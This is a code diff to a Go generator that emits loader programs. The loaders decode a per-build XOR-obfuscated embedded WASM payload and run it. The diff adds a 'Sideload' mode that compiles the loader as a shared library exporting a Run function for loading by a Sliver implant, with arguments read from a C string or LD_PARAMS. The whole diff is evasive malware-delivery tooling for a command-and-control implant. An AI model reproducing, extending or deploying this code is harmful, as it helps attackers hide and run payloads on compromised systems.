@@ -1109,6 +1109,11 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 	b.WriteString("// Code generated. DO NOT EDIT.\n")
 	b.WriteString("package main\n\n")
 
+	// Sideload: CGO preamble for //export Run (must sit immediately above import "C").
+	if cfg.Sideload {
+		b.WriteString("/*\n#include <stdlib.h>\n*/\nimport \"C\"\n\n")
+	}
+
 	// Imports — PE section mode uses debug/pe + zlib instead of embed.
 	b.WriteString("import (\n")
 	if pc.PEPayload {
@@ -1128,7 +1133,7 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 		b.WriteString("\t\"io\"\n")
 	}
 	b.WriteString("\t\"os\"\n")
-	if pc.PEPayload {
+	if pc.PEPayload || cfg.Sideload {
 		b.WriteString("\t\"strings\"\n")
 	}
 	b.WriteString("\n")
@@ -1218,8 +1223,14 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 		b.WriteString("\n\n")
 	}
 
-	// Main function.
-	b.WriteString("func main() {\n")
+	argsExpr := "os.Args"
+	if cfg.Sideload {
+		// Shared body used by //export Run; args come from C string / LD_PARAMS.
+		b.WriteString("func runWithArgs(args []string) {\n")
+		argsExpr = "args"
+	} else {
+		b.WriteString("func main() {\n")
+	}
 	b.WriteString("\tctx := context.Background()\n\n")
 
 	// Decode stub — reverses per-build XOR encoding.
@@ -1235,7 +1246,7 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 	// Runtime config struct — decoded data is the WASM payload directly.
 	b.WriteString(fmt.Sprintf("\t%s := &%s.Config{\n", pc.ConfigVar, pc.RuntimePkg))
 	b.WriteString(fmt.Sprintf("\t\t%s:   %s,\n", pc.FieldPayload, pc.DecodedVar))
-	b.WriteString("\t\tArgs:       os.Args,\n")
+	b.WriteString(fmt.Sprintf("\t\tArgs:       %s,\n", argsExpr))
 	b.WriteString("\t\tEnv:        os.Environ(),\n")
 	b.WriteString("\t\tStdout:     os.Stdout,\n")
 	b.WriteString("\t\tStderr:     os.Stderr,\n")
@@ -1250,9 +1261,32 @@ func (pc *polyConfig) generateMainGo(cfg HostConfig) string {
 	// Run.
 	b.WriteString(fmt.Sprintf("\tif err := %s.Run(ctx, %s); err != nil {\n", pc.RuntimePkg, pc.ConfigVar))
 	b.WriteString("\t\tfmt.Fprintf(os.Stderr, \"%v\\n\", err)\n")
-	b.WriteString("\t\tos.Exit(1)\n")
+	if cfg.Sideload {
+		// Do not os.Exit from a shared library — return to the implant.
+		b.WriteString("\t\treturn\n")
+	} else {
+		b.WriteString("\t\tos.Exit(1)\n")
+	}
 	b.WriteString("\t}\n")
 	b.WriteString("}\n\n")
+
+	if cfg.Sideload {
+		// Sliver Sideload entrypoint. Windows: implant passes args as a C string.
+		// Linux: when cargs is nil, fall back to LD_PARAMS (Sliver convention).
+		b.WriteString("//export Run\n")
+		b.WriteString("func Run(cargs *C.char) {\n")
+		b.WriteString("\targs := []string{\"app\"}\n")
+		b.WriteString("\tif cargs != nil {\n")
+		b.WriteString("\t\tif s := C.GoString(cargs); s != \"\" {\n")
+		b.WriteString("\t\t\targs = append(args, strings.Fields(s)...)\n")
+		b.WriteString("\t\t}\n")
+		b.WriteString("\t} else if v := os.Getenv(\"LD_PARAMS\"); v != \"\" {\n")
+		b.WriteString("\t\targs = append(args, strings.Fields(v)...)\n")
+		b.WriteString("\t}\n")
+		b.WriteString("\trunWithArgs(args)\n")
+		b.WriteString("}\n\n")
+		b.WriteString("func main() {}\n\n")
+	}
 
 	// Ensure hostmod package import is used.
 	b.WriteString(fmt.Sprintf("var _ = %s.NewFDTable\n", pc.HostmodPkg))
